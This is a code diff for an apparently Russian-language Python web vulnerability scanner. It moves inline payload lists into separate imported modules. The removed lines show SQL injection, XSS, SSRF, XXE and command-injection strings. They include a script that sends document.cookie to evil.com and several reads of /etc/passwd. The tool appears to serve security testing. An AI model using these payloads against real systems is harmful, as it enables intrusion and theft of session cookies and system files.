@@ -11,10 +11,13 @@ from urllib.parse import parse_qs, urlencode, urljoin, urlparse
 import aiohttp
 from bs4.element import Tag
 
+from payloads.rce import RCE_PAYLOADS
+from payloads.sql import ADVANCED_SQL_PAYLOADS
+from payloads.ssrf import SSRF_PAYLOADS
+from payloads.xss import ADVANCED_XSS_PAYLOADS
+from payloads.xxe import XXE_PAYLOADS
 from utils.logger import logger
 from utils.security import is_safe_url
-
-# Импорты из scanner_fixed.py не используются в этом файле
 
 
 class AdvancedScanner:
@@ -72,66 +75,13 @@ class AdvancedScanner:
             re.compile(r"volume in drive", re.IGNORECASE),  # dir
         ]
 
-        # Расширенные SQL-пейлоады
-        self.advanced_sql_payloads = [
-            "'; WAITFOR DELAY '00:00:05'--",  # Time-based для MS SQL
-            "'; SELECT pg_sleep(5)--",  # Time-based для PostgreSQL
-            "'; SELECT SLEEP(5)--",  # Time-based для MySQL
-            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",  # Command execution для MS SQL
-            "'; COPY (SELECT '') TO PROGRAM 'ping 127.0.0.1'--",  # Command execution для PostgreSQL
-            "'; UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--",  # File read для MySQL
-        ]
-
-        # Расширенные XSS-пейлоады
-        self.advanced_xss_payloads = [
-            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
-            "<svg><animate xlink:href=# onbegin=alert(1)></animate></svg>",
-            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
-            "<math><maction actiontype=statusline#x onmouseover=alert(1)>X</maction></math>",
-            "<body oninput=alert(1)><input autofocus>",
-            "<details open ontoggle=alert(1)>",
-            "<marquee onstart=alert(1)>X</marquee>",
-        ]
-
-        # SSRF-пейлоады
-        self.ssrf_payloads = [
-            "http://127.0.0.1:22",
-            "http://127.0.0.1:80",
-            "http://127.0.0.1:443",
-            "http://127.0.0.1:3306",
-            "http://127.0.0.1:5432",
-            "http://127.0.0.1:6379",
-            "http://127.0.0.1:11211",
-            "file:///etc/passwd",
-            "file:///etc/hosts",
-            "file:///windows/system32/drivers/etc/hosts",
-        ]
-
-        # XXE-пейлоады
-        self.xxe_payloads = [
-            """<?xml version="1.0" encoding="ISO-8859-1"?>
-            <!DOCTYPE foo [
-            <!ELEMENT foo ANY >
-            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-            <foo>&xxe;</foo>""",
-            """<?xml version="1.0" encoding="ISO-8859-1"?>
-            <!DOCTYPE foo [
-            <!ELEMENT foo ANY >
-            <!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts" >]>
-            <foo>&xxe;</foo>""",
-        ]
-
-        # RCE-пейлоады
-        self.rce_payloads = [
-            "; whoami",
-            "; id",
-            "; ls -la",
-            "; dir",
-            "; cat /etc/passwd",
-            r"; type c:\windows\system32\drivers\etc\hosts",
-            "; ping -c 5 127.0.0.1",
-            "; ping -n 5 127.0.0.1",
-        ]
+        # Сохраняем независимые изменяемые списки каждого экземпляра.
+        # Общие определения пейлоадов больше не дублируются в конструкторе.
+        self.advanced_sql_payloads: list[str] = ADVANCED_SQL_PAYLOADS.copy()
+        self.advanced_xss_payloads: list[str] = ADVANCED_XSS_PAYLOADS.copy()
+        self.ssrf_payloads: list[str] = SSRF_PAYLOADS.copy()
+        self.xxe_payloads: list[str] = XXE_PAYLOADS.copy()
+        self.rce_payloads: list[str] = RCE_PAYLOADS.copy()
 
     async def advanced_sql_injection_check(
         self, session: aiohttp.ClientSession, url: str, forms: list[Tag] | None = None
